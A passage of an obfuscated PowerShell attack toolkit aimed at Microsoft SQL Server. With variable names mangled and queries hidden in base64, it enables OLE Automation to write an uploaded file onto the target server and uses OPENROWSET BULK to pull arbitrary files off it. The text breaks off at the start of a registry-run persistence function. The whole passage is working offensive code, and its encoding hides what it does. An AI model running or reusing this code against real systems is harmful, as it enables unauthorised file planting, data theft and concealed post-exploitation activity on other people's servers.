        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_____/===\_/=====} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGwAbwBhAGQAUgBlAHMAdQBsAHQAcwA='))))
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                ${__/=\____/\__/==\}.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
                ${_/\_/\/=\/\/=\/\_} = 0
                ${/====\/\____/\_/\} = 0
                ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALgA=')))
                    ${_/=\/\__/\/\__/\/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAJwA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    ${_/\/===\/\/\/==\/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAG4AbwB0ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAAVABoAGkAcwAgAGMAbwBtAG0AYQBuAGQAIAByAGUAcQB1AGkAcgBlAHMAIABzAHkAcwBhAGQAbQBpAG4AIABwAHIAaQB2AGkAbABlAGcAZQBzAC4A')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))))
                    return
                }
                if (${_/\/===\/\/\/==\/} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAZQBuAGEAYgBsAGUAZAAuAA==')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABkAGkAcwBhAGIAbABlAGQALgA=')))
                    ${_/\_/\/=\/\/=\/\_} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${__/\____/\/\_/\/\} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${__/\____/\/\_/\/\} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A')))
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABmAGEAaQBsAGUAZAAuACAAQQBiAG8AcgB0AGkAbgBnAC4A')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A'))))
                        return
                    }
                }
                if (${_/=\/\__/\/\__/\/} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATwBsAGUAIABBAHUAdABvAG0AYQB0AGkAbwBuACAAUAByAG8AYwBlAGQAdQByAGUAcwAgAGEAcgBlACAAYQBsAHIAZQBhAGQAeQAgAGUAbgBhAGIAbABlAGQALgA=')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATwBsAGUAIABBAHUAdABvAG0AYQB0AGkAbwBuACAAUAByAG8AYwBlAGQAdQByAGUAcwAgAGEAcgBlACAAZABpAHMAYQBiAGwAZQBkAC4A')))
                    ${/====\/\____/\_/\} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAJwAsADEAOwBSAEUAQwBPAE4ARgBJAEcAVQBSAEUA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${___/=\/\/=\/\_/=\} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAiAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAIgA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${___/=\/\/=\/\_/=\} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMALgA=')))
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAATwBsAGUAIABBAHUAdABvAG0AYQB0AGkAbwBuACAAUAByAG8AYwBlAGQAdQByAGUAcwAgAGYAYQBpAGwAZQBkAC4AIABBAGIAbwByAHQAaQBuAGcALgA=')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMALgA='))))
                        return
                    }
                }
                ${/====\__/=\/=\__/} = (gi $InputFile).FullName
                write-verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgBlAGEAZABpAG4AZwAgAGkAbgBwAHUAdAAgAGYAaQBsAGUAOgAgACQAewAvAD0APQA9AD0AXABfAF8ALwA9AFwALwA9AFwAXwBfAC8AfQA=')))
                try
                {
                    ${__/====\/==\/\_/=} = [System.IO.File]::ReadAllBytes(${/====\__/=\/=\__/})
                    ${_/\___/\/====\/\/} = [System.BitConverter]::ToString(${__/====\/==\/\_/=})
                    ${_/\/==\_/\___/=\_} = (${_/\___/\/====\/\/} -replace "\-", "")
                }
                catch
                {
                    if(-not $SuppressVerbose)
                    {
                        ${/=\_______/===\__} = $_.Exception.Message
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIAByAGUAYQBkACAAaQBuAHAAdQB0ACAAZgBpAGwAZQA6ACAAJAB7AC8APQBcAF8AXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwB9AA==')))
                    }
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0ACAAZgBpAGwAZQAgAGMAbwB1AGwAZAAgAG4AbwB0ACAAYgBlACAAcgBlAGEAZAAuAA=='))))
                }
                write-verbose "$instance : Uploading $(${__/====\/==\/\_/=}.Length) bytes to: $OutputFile"           
                ${___/\/\__/\___/==} = 
$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAEMATABBAFIARQAgAEAAbwBiACAASQBOAFQAOwANAAoARQBYAEUAQwAgAHMAcABfAE8AQQBDAHIAZQBhAHQAZQAgACcAQQBEAE8ARABCAC4AUwB0AHIAZQBhAG0AJwAsACAAQABvAGIAIABPAFUAVABQAFUAVAA7AA0ACgBFAFgARQBDACAAcwBwAF8ATwBBAFMAZQB0AFAAcgBvAHAAZQByAHQAeQAgAEAAbwBiACwAIAAnAFQAeQBwAGUAJwAsACAAMQA7AA0ACgBFAFgARQBDACAAcwBwAF8ATwBBAE0AZQB0AGgAbwBkACAAQABvAGIALAAgACcATwBwAGUAbgAnADsADQAKAEUAWABFAEMAIABzAHAAXwBPAEEATQBlAHQAaABvAGQAIABAAG8AYgAsACAAJwBXAHIAaQB0AGUAJwAsACAATgBVAEwATAAsACAAMAB4ACQAewBfAC8AXAAvAD0APQBcAF8ALwBcAF8AXwBfAC8APQBcAF8AfQA7AA0ACgBFAFgARQBDACAAcwBwAF8ATwBBAE0AZQB0AGgAbwBkACAAQABvAGIALAAgACcAUwBhAHYAZQBUAG8ARgBpAGwAZQAnACwAIABOAFUATABMACwAIAAnACQATwB1AHQAcAB1AHQARgBpAGwAZQAnACwAIAAyADsADQAKAEUAWABFAEMAIABzAHAAXwBPAEEATQBlAHQAaABvAGQAIABAAG8AYgAsACAAJwBDAGwAbwBzAGUAJwA7AA0ACgBFAFgARQBDACAAcwBwAF8ATwBBAEQAZQBzAHQAcgBvAHkAIABAAG8AYgA7AA==')))
                $null = Get-SQLQuery -Instance $Instance -Query ${___/\/\__/\___/==} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
                ${_/====\/\_/=\/==\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAG0AYQBzAHQAZQByAC4ALgB4AHAAXwBmAGkAbABlAGUAeABpAHMAdAAgACcAJABPAHUAdABwAHUAdABGAGkAbABlACcAIABXAEkAVABIACAAUgBFAFMAVQBMAFQAIABTAEUAVABTACAAKAAoAGYAaQBsAGUAZQB4AGkAcwB0AHMAIABiAGkAdAAsACAAZgBpAGwAZQBpAHMAZABpAHIAZQBjAHQAbwByAHkAIABiAGkAdAAsACAAcABhAHIAZQBuAHQAZABpAHIAZQBjAHQAbwByAHkAZQB4AGkAcwB0AHMAIABiAGkAdAApACkA')))
                ${____/=\_/\___/=\/} = Get-SQLQuery -Instance $Instance -Query ${_/====\/\_/=\/==\} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property fileexists -ExpandProperty fileexists
                if (${____/=\_/\___/=\/} -eq $True)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwB1AGMAYwBlAHMAcwAuACAARgBpAGwAZQAgAHUAcABsAG8AYQBkAGUAZAAuAA==')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARgBhAGkAbAB1AHIAZQAuACAARgBpAGwAZQAgAE4ATwBUACAAdQBwAGwAbwBhAGQAZQBkAC4A')))
                }
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ComputerName, $Instance, [string]${____/=\_/\___/=\/})
                if(${/====\/\____/\_/\} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIAAnAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMA')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAJwAsADAAOwBSAEUAQwBPAE4ARgBJAEcAVQBSAEUA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                if(${_/\_/\/=\/\/=\/\_} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIABTAGgAbwB3ACAAQQBkAHYAYQBuAGMAZQBkACAATwBwAHQAaQBvAG4AcwA=')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                ${__/=\____/\__/==\}.Close()
                ${__/=\____/\__/==\}.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    ${/=\_______/===\__} = $_.Exception.Message
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlACAAbwByACAAQwBvAG0AbQBhAG4AZAAgAEYAYQBpAGwAZQBkAA=='))))
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${/=\_____/\/\/=\__}
    }
}
Function  Invoke-SQLDownloadFile
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'Source file to download from target SQL Server filesystem.')]
        [String]$SourceFile = "",
        [Parameter(Mandatory = $true,
        HelpMessage = 'Where to save downloaded file locally on the user filesystem.')]
        [String]$OutputFile = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_____/===\_/=====} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAHcAbgBsAG8AYQBkAFIAZQBzAHUAbAB0AHMA'))))
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                ${__/=\____/\__/==\}.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
                ${_/====\/\_/=\/==\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAG0AYQBzAHQAZQByAC4ALgB4AHAAXwBmAGkAbABlAGUAeABpAHMAdAAgACcAJABTAG8AdQByAGMAZQBGAGkAbABlACcAIABXAEkAVABIACAAUgBFAFMAVQBMAFQAIABTAEUAVABTACAAKAAoAGYAaQBsAGUAZQB4AGkAcwB0AHMAIABiAGkAdAAsACAAZgBpAGwAZQBpAHMAZABpAHIAZQBjAHQAbwByAHkAIABiAGkAdAAsACAAcABhAHIAZQBuAHQAZABpAHIAZQBjAHQAbwByAHkAZQB4AGkAcwB0AHMAIABiAGkAdAApACkA')))
                ${____/=\_/\___/=\/} = Get-SQLQuery -Instance $Instance -Query ${_/====\/\_/=\/==\} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property fileexists -ExpandProperty fileexists
                if (${____/=\_/\___/=\/} -eq $True)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARgBpAGwAZQAgAGUAeABpAHMAdABzAC4AIABBAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAZABvAHcAbgBsAG8AYQBkADoAIAAkAFMAbwB1AHIAYwBlAEYAaQBsAGUA')))
                    ${_/=\/\__/\/\_/==\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAAqACAARgBSAE8ATQAgAE8AUABFAE4AUgBPAFcAUwBFAFQAKABCAFUATABLACAATgAnACQAUwBvAHUAcgBjAGUARgBpAGwAZQAnACwAIABTAEkATgBHAEwARQBfAEIATABPAEIAKQAgAHIAcwA=')))
                    ${__/====\/==\/\_/=} = Get-SQLQuery -Instance $Instance -Query ${_/=\/\__/\/\_/==\} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property BulkColumn -ExpandProperty BulkColumn
                    ${/=\_/\_/\/====\_/} = ${__/====\/==\/\_/=} -split ' '
                    Write-Verbose "$Instance : Downloaded. Writing $(${/=\_/\_/\/====\_/}.Length) to $OutputFile..."
                    ${/===\__/===\__/\/} = (${/=\_/\_/\/====\_/} | % {[byte][convert]::ToInt32($_)})
                    [IO.File]::WriteAllBytes($OutputFile, ${/===\__/===\__/\/})
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$True)
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARgBhAGkAbAB1AHIAZQAuACAAUwBwAGUAYwBpAGYAaQBlAGQAIABmAGkAbABlACAAZABvAGUAcwAgAG4AbwB0ACAAZQB4AGkAcwB0AC4A')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUAIABmAGkAbABlACAAZABvAGUAcwAgAG4AbwB0ACAAZQB4AGkAcwB0AA=='))))
                }
                ${__/=\____/\__/==\}.Close()
                ${__/=\____/\__/==\}.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    ${/=\_______/===\__} = $_.Exception.Message
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                    Write-Verbose  $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABFAHIAcgBvAHIAOgAgACQAewAvAD0AXABfAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8AfQA=')))
                }
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlACAAbwByACAAQwBvAG0AbQBhAG4AZAAgAEYAYQBpAGwAZQBkAA=='))))
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${/=\_____/\/\/=\__}
    }
}
Function   Get-SQLPersistRegRun
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
